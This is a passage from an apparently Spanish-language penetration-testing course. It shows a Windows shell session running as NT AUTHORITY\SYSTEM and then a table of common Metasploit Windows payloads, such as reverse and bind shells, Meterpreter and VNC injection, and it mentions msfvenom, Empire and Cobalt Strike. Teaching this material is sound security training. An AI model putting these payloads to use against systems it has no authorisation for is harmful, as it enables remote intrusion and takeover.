 Volume Serial Number is A0EF-1911

 Directory of C:\Users

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Administrator
14/07/2017  14:45    <DIR>          haris
12/04/2011  08:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  15,738,978,304 bytes free

C:\Users>whoami

whoami
nt authority\system
```

Veamos qué otros tipos de payloads podemos usar. Revisaremos los más comunes relacionados con los sistemas operativos Windows.

---
## Payload Types

La tabla a continuación contiene los payloads más comunes utilizados para máquinas Windows y sus respectivas descripciones.

|**Payload**|**Description**|
|---|---|
|`generic/custom`|Listener genérico, multiuso|
|`generic/shell_bind_tcp`|Listener genérico, multiuso, shell normal, conexión TCP bind|
|`generic/shell_reverse_tcp`|Listener genérico, multiuso, shell normal, conexión TCP inversa|
|`windows/x64/exec`|Ejecuta un comando arbitrario (Windows x64)|
|`windows/x64/loadlibrary`|Carga una ruta de biblioteca x64 arbitraria|
|`windows/x64/messagebox`|Genera un diálogo mediante MessageBox utilizando un título, texto e icono personalizables|
|`windows/x64/shell_reverse_tcp`|Shell normal, payload single, conexión TCP inversa|
|`windows/x64/shell/reverse_tcp`|Shell normal, stager + stage, conexión TCP inversa|
|`windows/x64/shell/bind_ipv6_tcp`|Shell normal, stager + stage, stager IPv6 Bind TCP|
|`windows/x64/meterpreter/$`|Payload de Meterpreter + variedades anteriores|
|`windows/x64/powershell/$`|Sesiones interactivas de PowerShell + variedades anteriores|
|`windows/x64/vncinject/$`|VNC Server (Reflective Injection) + variedades anteriores|

Otros payloads críticos que son utilizados en gran medida por los testers de penetración durante evaluaciones de seguridad son los payloads de Empire y Cobalt Strike. Estos no están en el alcance de este curso, pero siéntase libre de investigarlos en nuestro tiempo libre ya que pueden proporcionar una cantidad significativa de información sobre cómo los testers de penetración profesionales realizan sus evaluaciones en objetivos de alto valor.

Además de estos, por supuesto, hay una plétora de otros payloads por ahí. Algunos son para proveedores de dispositivos específicos, como Cisco, Apple o PLCs. Algunos podemos generarlos nosotros mismos utilizando `msfvenom`. Sin embargo, a continuación, revisaremos los `Encoders` y cómo pueden usarse para influir en el resultado del ataque.